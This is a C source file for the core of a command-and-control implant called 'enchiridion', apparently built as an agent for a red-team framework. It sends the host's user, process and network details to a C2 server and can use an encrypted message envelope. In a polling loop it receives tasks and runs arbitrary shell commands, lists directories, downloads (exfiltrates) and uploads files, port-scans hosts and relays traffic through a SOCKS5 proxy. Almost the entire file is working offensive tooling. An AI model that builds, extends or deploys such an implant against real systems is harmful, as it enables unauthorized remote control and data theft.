#include "enchiridion.h"
#include "agent.h"
#include "b64.h"
#include "c2.h"
#include "cJSON.h"
#include "commands.h"
#include "config.h"
#include "crypto.h"
#include "download.h"
#include "socks5.h"
#include "task_kill.h"
#include "port_scan.h"
#include "upload.h"
#include "utils.h"
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

// Global
bool g_exit = false;

// ---------------------------------------------------------------------------
// Message serialisation helpers
// ---------------------------------------------------------------------------

// Build the outbound wire payload: base64(UUID[36] + body).
// NONE:       body = plain JSON
// STATIC_KEY/EKE: body = IV[16] + AES-256-CBC(JSON) + HMAC-SHA256[32]
//             The checkin is always plain (see checkIn()) — encryption
//             applies only to post-checkin messages.
char *buildOutbound(Agent *agent, const char *json_str, size_t *out_len) {
#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)
    unsigned char *enc = NULL;
    size_t enc_len = 0;
    if (crypto_encrypt(agent->session_key, (const unsigned char *)json_str, strlen(json_str), &enc, &enc_len) != 0) {
        return NULL;
    }
    size_t msg_len = UUIDSIZE + enc_len;
    unsigned char *msg = malloc(msg_len);
    if (!msg) {
        free(enc);
        return NULL;
    }
    memcpy(msg, agent->uuid, UUIDSIZE);
    memcpy(msg + UUIDSIZE, enc, enc_len);
    free(enc);
    char *b64 = base64_encode(msg, msg_len, out_len);
    free(msg);
    return b64;
#else
    size_t json_len = strlen(json_str);
    char *msg = calloc(UUIDSIZE + json_len + 1, sizeof(char));
    if (!msg)
        return NULL;
    memcpy(msg, agent->uuid, UUIDSIZE);
    memcpy(msg + UUIDSIZE, json_str, json_len);
    char *b64 = base64_encode((const unsigned char *)msg, UUIDSIZE + json_len, out_len);
    free(msg);
    return b64;
#endif
}

int main(int argc, char *argv[], char *envp[]) {
    // Make a new agent
    Agent *agent = createAgent(argv[0]);
#ifdef DEBUG
    printAgent(agent);
#endif
    c2Setup();

#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)
    // Decode the static key embedded at build time (base64 → raw bytes).
    // For EKE this is the AESPSK used to encrypt the staging exchange;
    // crypto_eke_stage() replaces it with the negotiated session key.
    {
        size_t key_len = 0;
        unsigned char *key_bytes = base64_decode(STATIC_KEY_B64, strlen(STATIC_KEY_B64), &key_len);
        if (key_bytes && key_len == 32) {
            memcpy(agent->session_key, key_bytes, 32);
            DBGPRINT("STATIC_KEY: key loaded OK (first 4 bytes: %02x%02x%02x%02x)", key_bytes[0], key_bytes[1],
                     key_bytes[2], key_bytes[3]);
        } else {
            DBGPRINT("STATIC_KEY: bad key material (len=%zu)", key_len);
        }
        free(key_bytes);
    }
#endif

#ifdef ENCRYPTION_EKE
    // Perform RSA key exchange before checkin to obtain UUID + session key.
    if (crypto_eke_stage(agent) != 0) {
        DBGPRINT("EKE staging failed");
        c2Teardown();
        destroyAgent(agent);
        return 0;
    }
#endif

    // Attempt checkIn
    int ret = checkIn(agent);
    if (ret != 0) {
        c2Teardown();
        destroyAgent(agent);
        return 0;
    }

    // Create threadpool if we have successfully checked in
    ThreadPool *pool = threadPoolInit(NUM_THREADS);

    // Call main tasking loop
    taskingLoop(agent, pool);

    // Exiting tasking loop and cleaning up
    threadPoolDestroy(pool);
    c2Teardown();
    destroyAgent(agent);
    return 0;
}

int checkIn(Agent *agent) {
    // TODO: handle errors
    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "action", "checkin");
    cJSON_AddStringToObject(json, "uuid", agent->payload_uuid);
    cJSON_AddNumberToObject(json, "pid", agent->pid);
    cJSON_AddStringToObject(json, "process_name", agent->procname);
    cJSON_AddStringToObject(json, "os", agent->os);
    cJSON_AddStringToObject(json, "host", agent->host);
    cJSON_AddStringToObject(json, "user", agent->user);
    cJSON *ips = cJSON_AddArrayToObject(json, "ips");
    for (int i = 0; i < agent->ipcount; i++) {
        cJSON *ip = cJSON_CreateString(agent->ips[i]);
        cJSON_AddItemToArray(ips, ip);
    }

    char *json_str = cJSON_Print(json);
    size_t len;

    // The C2 profile knows the payload's staging key and can decrypt the
    // checkin before the callback exists. Use buildOutbound so the same
    // AES256_HMAC envelope is applied for STATIC_KEY and EKE modes.
    char *data = buildOutbound(agent, json_str, &len);
    cJSON_free(json_str);
    cJSON_Delete(json);
    if (!data)
        return -1;

    MsgResp resp = {0};
    c2Send(agent, data, (int)len, &resp);
    free(data);

    if (resp.response == NULL)
        return -1;

    // Decode and (if encrypted) decrypt the checkin response.
    // The server uses the same staging key and the payload UUID for HMAC.
    size_t raw_len = str_rtrim(resp.response, strlen(resp.response));
    unsigned char *raw = base64_decode(resp.response, raw_len, &raw_len);
    free(resp.response);
    if (!raw || raw_len <= UUIDSIZE) {
        free(raw);
        return -1;
    }

#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)
    {
        unsigned char *plain = NULL;
        size_t plain_len = 0;
        if (crypto_decrypt(agent->session_key, raw + UUIDSIZE, raw_len - UUIDSIZE, &plain, &plain_len) != 0) {
            free(raw);
            return -1;
        }
        free(raw);
        json = cJSON_ParseWithLength((char *)plain, plain_len);
        free(plain);
    }
#else
    json = cJSON_ParseWithLength((char *)(raw + UUIDSIZE), raw_len - UUIDSIZE);
    free(raw);
#endif

    const cJSON *uuid = cJSON_GetObjectItem(json, "id");
    if (cJSON_IsString(uuid) && (uuid->valuestring != NULL)) {
        memcpy(agent->uuid, uuid->valuestring, UUIDSIZE);
    }

    cJSON_Delete(json);
    return 0;
}

int sendResponse(Agent *agent, TaskResponse *task_response) {
    // TODO: handle errors
    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "action", "post_response");
    cJSON *responses = cJSON_AddArrayToObject(json, "responses");
    cJSON *response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "task_id", task_response->task_uuid);
    cJSON_AddStringToObject(response, "status", task_response->status == 0 ? "success" : "error");
    cJSON_AddBoolToObject(response, "completed", true);
    if (task_response->formatted_response != NULL) {
        // When formatted_response output will be the key name for the object
        cJSON_AddItemToObject(response, task_response->formatted_response_key, task_response->formatted_response);
    } else {
        // If no formatted response then no user_output
        if (task_response->output == NULL) {
            cJSON_AddStringToObject(response, "user_output", "Failed to allocate space for output");
        } else {
            cJSON_AddStringToObject(response, "user_output", task_response->output);
        }
    }
    cJSON_AddItemToArray(responses, response);

    char *json_str = cJSON_Print(json);
    size_t len;

    char *data = buildOutbound(agent, json_str, &len);
    DBGPRINT("SendResponse: %s", data);
    cJSON_free(json_str);
    cJSON_Delete(json);

    // send post
    MsgResp resp = {0};
    int ret = 0;
    if (data) {
        ret = c2Send(agent, data, (int)len, &resp);
        if (ret != 0) {
            DBGPRINT("c2Send failed: %d", ret);
        }
        free(data);
    } else {
        ret = -1;
    }

    free(resp.response);
    if (task_response->output != NULL) {
        free(task_response->output);
    }
    return ret;
}

void handleTask(TaskBundle *bundle) {
    // Handle the logic for individual tasks, run them, and send repsonses

    // Obtain the JSON string, decrypting if needed.
#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)
    unsigned char *plain_task = NULL;
    size_t plain_task_len = 0;
    if (crypto_decrypt(bundle->agent->session_key, (unsigned char *)(bundle->decoded_task + UUIDSIZE),
                       (size_t)(bundle->size - UUIDSIZE), &plain_task, &plain_task_len) != 0) {
        DBGPRINT("handleTask: crypto_decrypt failed, dropping message");
        free(bundle->decoded_task);
        free(bundle);
        return;
    }
    char *task_str = (char *)plain_task;
    cJSON *json = cJSON_ParseWithLength(task_str, plain_task_len);
    free(plain_task);
#else
    char *task_str = bundle->decoded_task + UUIDSIZE;
    cJSON *json = cJSON_ParseWithLength((char *)task_str, bundle->size - UUIDSIZE);
#endif

    // Handle download/upload ack responses routed back through the task queue
    cJSON *action_item = cJSON_GetObjectItem(json, "action");
    if (cJSON_IsString(action_item) && strcmp(action_item->valuestring, "post_response") == 0) {
        cJSON *responses = cJSON_GetObjectItem(json, "responses");
        if (cJSON_IsArray(responses) && cJSON_GetArraySize(responses) > 0) {
            cJSON *resp_item = cJSON_GetArrayItem(responses, 0);
            cJSON *task_id_item = cJSON_GetObjectItem(resp_item, "task_id");
            if (cJSON_IsString(task_id_item)) {
                int status_ok = 0;
                cJSON *status_item = cJSON_GetObjectItem(resp_item, "status");
                if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "success") == 0)
                    status_ok = 1;

                char task_uuid_copy[UUIDSIZE + 1] = {0};
                strncpy(task_uuid_copy, task_id_item->valuestring, UUIDSIZE);
                Agent *ack_agent = bundle->agent;

                int result;
                const char *complete_msg;
                const char *fail_msg;

                // Upload chunk responses carry chunk_data; download acks do not.
                cJSON *chunk_data_item = cJSON_GetObjectItem(resp_item, "chunk_data");
                if (cJSON_IsString(chunk_data_item)) {
                    int total_chunks = 0;
                    int chunk_num = 0;
                    cJSON *tc = cJSON_GetObjectItem(resp_item, "total_chunks");
                    if (cJSON_IsNumber(tc))
                        total_chunks = (int)tc->valuedouble;
                    cJSON *cn = cJSON_GetObjectItem(resp_item, "chunk_num");
                    if (cJSON_IsNumber(cn))
                        chunk_num = (int)cn->valuedouble;
                    result = processUploadChunk(task_uuid_copy, total_chunks, chunk_num, chunk_data_item->valuestring,
                                                status_ok);
                    complete_msg = "Upload complete";
                    fail_msg = "Upload failed";
                } else {
                    const char *file_id = NULL;
                    cJSON *file_id_item = cJSON_GetObjectItem(resp_item, "file_id");
                    if (cJSON_IsString(file_id_item))
                        file_id = file_id_item->valuestring;
                    result = processDownloadAck(task_uuid_copy, file_id, status_ok);
                    complete_msg = "Download complete";
                    fail_msg = "Download failed";
                }

                free(bundle->decoded_task);
                free(bundle);
                cJSON_Delete(json);

                if (result != 0) {
                    TaskResponse task_response = {0};
                    task_response.task_uuid = task_uuid_copy;
                    task_response.status = (result == 1) ? 0 : -1;
                    task_response.output = malloc(ERR_MSG_SIZE);
                    if (task_response.output) {
                        if (result == 1)
                            memcpy(task_response.output, complete_msg, strlen(complete_msg) + 1);
                        else
                            memcpy(task_response.output, fail_msg, strlen(fail_msg) + 1);
                    }
                    sendResponse(ack_agent, &task_response);
                }
                return;
            }
        }
        free(bundle->decoded_task);
        free(bundle);
        cJSON_Delete(json);
        return;
    }

    // First get tasks and ensure there are tasks
    cJSON *tasks_array = cJSON_GetObjectItem(json, "tasks");
    if (cJSON_IsArray(tasks_array) && cJSON_GetArraySize(tasks_array) > 0) {
        // Try and get the commands from the tasks

        // try and get the tasks
        cJSON *tasks = cJSON_GetArrayItem(tasks_array, 0);

        // Get task command
        cJSON *command = cJSON_GetObjectItem(tasks, "command");

        if (cJSON_IsString(command) && (command->valuestring != NULL)) {
            // Get task id
            const cJSON *task_uuid = cJSON_GetObjectItem(tasks, "id");

            // Register this thread as the handler for the task so task_kill can target it.
            if (cJSON_IsString(task_uuid) && task_uuid->valuestring != NULL)
                taskRegister(task_uuid->valuestring, pthread_self(), bundle->pool);

            // Get parameters for the tasks
            cJSON *params = cJSON_GetObjectItem(tasks, "parameters");

            cJSON *param_json = NULL;
            if (cJSON_IsString(params) && (params->valuestring != NULL))
                param_json = cJSON_Parse(params->valuestring);

            // If it is a shell command get command to run
            if (strcmp(command->valuestring, "shell") == 0) {
                if (param_json != NULL) {
                    cJSON *shell_cmd = cJSON_GetObjectItem(param_json, "command");
                    if (cJSON_IsString(shell_cmd) && (shell_cmd->valuestring != NULL)) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        shellExecute(shell_cmd->valuestring, task_uuid->valuestring, &task_response);
                        sendResponse(bundle->agent, &task_response);
                    }
                }
            } else if (strcmp(command->valuestring, "ls") == 0) {
                if (param_json != NULL) {
                    cJSON *path = cJSON_GetObjectItem(param_json, "path");
                    if (cJSON_IsString(path) && (path->valuestring != NULL)) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        fileListing(path->valuestring, &task_response);
                        sendResponse(bundle->agent, &task_response);
                    }
                }
            } else if (strcmp(command->valuestring, "download") == 0) {
                if (param_json != NULL) {
                    cJSON *path = cJSON_GetObjectItem(param_json, "path");
                    if (cJSON_IsString(path) && (path->valuestring != NULL)) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        if (download(path->valuestring, task_uuid->valuestring, bundle->agent, &task_response) != 1) {
                            sendResponse(bundle->agent, &task_response);
                        }
                    }
                }
            } else if (strcmp(command->valuestring, "upload") == 0) {
                if (param_json != NULL) {
                    cJSON *file = cJSON_GetObjectItem(param_json, "file");
                    cJSON *remote_path = cJSON_GetObjectItem(param_json, "remote_path");
                    if (cJSON_IsString(file) && file->valuestring != NULL && cJSON_IsString(remote_path) &&
                        remote_path->valuestring != NULL) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        if (upload(file->valuestring, remote_path->valuestring, task_uuid->valuestring, bundle->agent,
                                   &task_response) != 1) {
                            sendResponse(bundle->agent, &task_response);
                        }
                    }
                }
            } else if (strcmp(command->valuestring, "task_kill") == 0) {
                if (param_json != NULL) {
                    cJSON *target_id = cJSON_GetObjectItem(param_json, "task_id");
                    if (cJSON_IsString(target_id) && target_id->valuestring != NULL) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        taskKillCommand(target_id->valuestring, bundle->agent, &task_response);
                        sendResponse(bundle->agent, &task_response);
                    }
                }
            // TODO: Implement port scan
            }  else if (strcmp(command->valuestring, "pscan") == 0) {
                if (param_json != NULL) {
                    cJSON *host = cJSON_GetObjectItem(param_json, "host");
                    cJSON *mode = cJSON_GetObjectItem(param_json, "mode");
                    cJSON *port = cJSON_GetObjectItem(param_json, "port");



//check parameters are what we think they are 
                if (cJSON_IsString(host) && (host->valuestring != NULL)) {
                        TaskResponse task_response = {0};
                        task_response.task_uuid = task_uuid->valuestring;
                        //(char *host, char *port, char *mode, TaskResponse *resp)
                        portScan(host->valuestring,port->valuestring,mode->valuestring, &task_response);
                        sendResponse(bundle->agent, &task_response);
                    }
                }
            } else if (strcmp(command->valuestring, "socks") == 0) {
                TaskResponse task_response = {0};
                task_response.task_uuid = task_uuid->valuestring;
                const char *action = NULL;
                if (param_json != NULL) {
                    cJSON *a = cJSON_GetObjectItem(param_json, "action");
                    if (cJSON_IsString(a))
                        action = a->valuestring;
                }
                if (action != NULL && strcmp(action, "flush") == 0) {
                    socksFlush();
                    task_response.output = malloc(20);
                    if (task_response.output)
                        memcpy(task_response.output, "Connections flushed", 20);
                } else if (action != NULL && strcmp(action, "stop") == 0) {
                    socksFlush();
                    task_response.output = malloc(21);
                    if (task_response.output)
                        memcpy(task_response.output, "SOCKS5 proxy stopped", 21);
                } else {
                    task_response.output = malloc(22);
                    if (task_response.output)
                        memcpy(task_response.output, "SOCKS5 proxy started", 21);
                }
                sendResponse(bundle->agent, &task_response);
            }
            // if exit cleanup and exit
            else if (strcmp(command->valuestring, "exit") == 0) {
                TaskResponse task_response = {0};
                task_response.task_uuid = task_uuid->valuestring;
                task_response.output = malloc(7);
                memcpy(task_response.output, "Exited", sizeof("Exited"));
                sendResponse(bundle->agent, &task_response);
                // param_json freed by common cleanup below
                g_exit = true;
            }

            // Deregister now that the command has returned.
            if (cJSON_IsString(task_uuid) && task_uuid->valuestring != NULL)
                taskDeregister(task_uuid->valuestring);

            // Clean up param_json
            if (param_json)
                cJSON_Delete(param_json);
        }
    }

    // Process any SOCKS5 relay messages piggybacked on the get_tasking response
    cJSON *socks_in = cJSON_GetObjectItem(json, "socks");
    if (cJSON_IsArray(socks_in) && cJSON_GetArraySize(socks_in) > 0)
        socksProcessInbound(socks_in);

    // Clean up task bundle and JSON
    free(bundle->decoded_task);
    free(bundle);
    cJSON_Delete(json);
}

void taskingLoop(Agent *agent, ThreadPool *pool) {
    // Check on agent and pool
    if (!pool) {
        DBGPRINT("ThreadPool is null");
    }
    if (!agent) {
        DBGPRINT("Agent is null");
    }
    socksInit();
    // TODO: handle errors
    while (!g_exit) {
        // Drain any download chunks queued by worker threads before polling for tasks
        OutgoingChunk *out;
        while ((out = dequeueOutgoing()) != NULL) {
            int chunk_id = out->chunk_id;
            MsgResp resp = {0};
            c2Send(agent, out->payload, out->payload_len, &resp);
            free(out->payload);
            free(out);
            DBGPRINT("DrainChunk[id=%d]: response=%s", chunk_id, resp.response ? resp.response : "(null)");
            if (resp.response) {
                size_t decoded_len = str_rtrim(resp.response, strlen(resp.response));
                unsigned char *decoded = base64_decode(resp.response, decoded_len, &decoded_len);
                free(resp.response);
                if (decoded) {
                    TaskBundle *ack_bundle = malloc(sizeof(TaskBundle));
                    if (ack_bundle) {
                        ack_bundle->agent = agent;
                        ack_bundle->pool = pool;
                        ack_bundle->decoded_task = (char *)decoded;
                        ack_bundle->size = (int)decoded_len;
                        threadPoolSubmit(pool, ack_bundle);
                    } else {
                        free(decoded);
                    }
                }
            }
        }

        cJSON *json;
        MsgResp req = {0};
        // Build tasking request
        json = cJSON_CreateObject();
        cJSON_AddStringToObject(json, "action", "get_tasking");
        cJSON_AddNumberToObject(json, "tasking_size", 1);
        cJSON *socks_out = socksPollOutbound();
        if (socks_out != NULL)
            cJSON_AddItemToObject(json, "socks", socks_out);
        char *json_str = cJSON_Print(json);
        size_t len;

        char *data = buildOutbound(agent, json_str, &len);
        cJSON_free(json_str);
        cJSON_Delete(json);

        // Send post to request tasking
        if (data) {
            c2Send(agent, data, (int)len, &req);
            free(data);
        }

        if (req.response) {
            size_t raw_len = str_rtrim(req.response, strlen(req.response));
            unsigned char *req_decoded = base64_decode(req.response, raw_len, &len);
            free(req.response);
            if (req_decoded) {
                TaskBundle *bundle = malloc(sizeof(TaskBundle));
                if (bundle) {
                    bundle->agent = agent;
                    bundle->pool = pool;
                    bundle->decoded_task = (char *)req_decoded;
                    bundle->size = (int)len;
                    threadPoolSubmit(pool, bundle);
                } else {
                    free(req_decoded);
                }
            }
        }

        // Sleep until next request
        sleep(agent->sleeptime);
    }
    socksTeardown();
}

ThreadPool *threadPoolInit(int num_threads) {
    // Allocate the threadpool and workers
    if (num_threads <= 0) {
        DBGPRINT("Number of threads is less than or equal to 0");
        return NULL;
    }

    ThreadPool *pool = calloc(1, sizeof(ThreadPool));
    if (!pool) {
        DBGPRINT("Failed to allocate pool");
        return NULL;
    }

    pool->workers = malloc(num_threads * sizeof(pthread_t));
    if (!pool->workers) {
        free(pool);
        DBGPRINT("Failed to allocate workers");
        return NULL;
    }

    // Initialize mutex
    int ret = pthread_mutex_init(&pool->lock, NULL);
    if (ret != 0) {
        DBGPRINT("threadpool_create: mutex init failed: %s", strerror(ret));
        free(pool->workers);
        free(pool);
        return NULL;
    }

    // Initialize condition
    ret = pthread_cond_init(&pool->cond, NULL);
    if (ret != 0) {
        DBGPRINT("threadpool_create: cond init failed: %s", strerror(ret));
        pthread_mutex_destroy(&pool->lock);
        free(pool->workers);
        free(pool);
        return NULL;
    }

    // Initialize all threads
    pool->num_threads = num_threads;
    for (int i = 0; i < num_threads; i++) {
        ret = pthread_create(&pool->workers[i], NULL, worker, pool);
        if (ret != 0) {
            DBGPRINT("threadpool_create: thread %d create failed: %s", i, strerror(ret));
            pthread_mutex_lock(&pool->lock);
            pool->stop = 1;
            pthread_cond_broadcast(&pool->cond);
            pthread_mutex_unlock(&pool->lock);

            for (int j = 0; j < i; j++)
                pthread_join(pool->workers[j], NULL);

            pthread_cond_destroy(&pool->cond);
            pthread_mutex_destroy(&pool->lock);
            free(pool->workers);
            free(pool);
            return NULL;
        }
    }

    return pool;
}

void threadPoolDestroy(ThreadPool *pool) {
    if (!pool)
        return;

    // Acquire the mutex, stop pool and broadcast that condition
    pthread_mutex_lock(&pool->lock);
    pool->stop = 1;
    pthread_cond_broadcast(&pool->cond);
    pthread_mutex_unlock(&pool->lock);

    // After unlock join all the threads
    for (int i = 0; i < pool->num_threads; i++)
        pthread_join(pool->workers[i], NULL);

    // All threads joined so let's cleanup tasks
    Task *tasks = pool->head;
    while (tasks) {
        Task *next = tasks->next;
        free(tasks);
        tasks = next;
    }

    // Destroy cond and mutex
    pthread_cond_destroy(&pool->cond);
    pthread_mutex_destroy(&pool->lock);

    // Free workers and pool
    free(pool->workers);
    free(pool);
}

int threadPoolSubmit(ThreadPool *pool, void *arg) {
    if (!pool) {
        DBGPRINT("ThreadPool is null");
        return -1;
    }

    // Create a task
    Task *task = malloc(sizeof(Task));
    if (!task) {
        DBGPRINT("Failed to allocate task");
        return -1;
    }
    task->arg = arg;
    task->next = NULL;

    // Lock the mutex
    int ret = pthread_mutex_lock(&pool->lock);
    if (ret != 0) {
        DBGPRINT("threadpool_submit: mutex lock failed: %s", strerror(ret));
        free(task);
        return -1;
    }

    // If stopping the pool bail on current task
    if (pool->stop) {
        pthread_mutex_unlock(&pool->lock);
        free(task);
        return 0;
    }

    // Add task to linked list
    if (pool->tail) {
        pool->tail->next = task;
    } else {
        pool->head = task;
    }
    pool->tail = task;

    // Signal that a new task has been added
    ret = pthread_cond_signal(&pool->cond);
    if (ret != 0) {
        DBGPRINT("threadpool_submit: cond signal failed: %s", strerror(ret));
    }

    // unlock mutex
    pthread_mutex_unlock(&pool->lock);
    return 0;
}

static void unlockMutex(void *arg) { pthread_mutex_unlock((pthread_mutex_t *)arg); }

void *worker(void *arg) {
    // Get the thread pool
    ThreadPool *pool = (ThreadPool *)arg;

    // Run until stopped
    while (1) {
        // Acquire lock
        int ret = pthread_mutex_lock(&pool->lock);
        if (ret != 0) {
            DBGPRINT("worker: mutex lock failed: %s", strerror(ret));
            break;
        }

        // Cleanup handler releases the mutex if pthread_cancel fires inside cond_wait.
        pthread_cleanup_push(unlockMutex, &pool->lock);

        // Wait for a task to appear
        while (!pool->head && !pool->stop)
            pthread_cond_wait(&pool->cond, &pool->lock);

        // Normal wakeup: pop without executing the cleanup (we unlock manually below).
        pthread_cleanup_pop(0);

        // If the pool is stopped bail
        if (pool->stop && !pool->head) {
            pthread_mutex_unlock(&pool->lock);
            break;
        }

        // Get the task
        Task *task = pool->head;
        pool->head = task->next;
        if (!pool->head)
            pool->tail = NULL;

        // Give lock back
        pthread_mutex_unlock(&pool->lock);

        // Execute the handler
        if (task->arg)
            handleTask(task->arg);
        free(task);
    }

    // Clean exit
    return NULL;
}
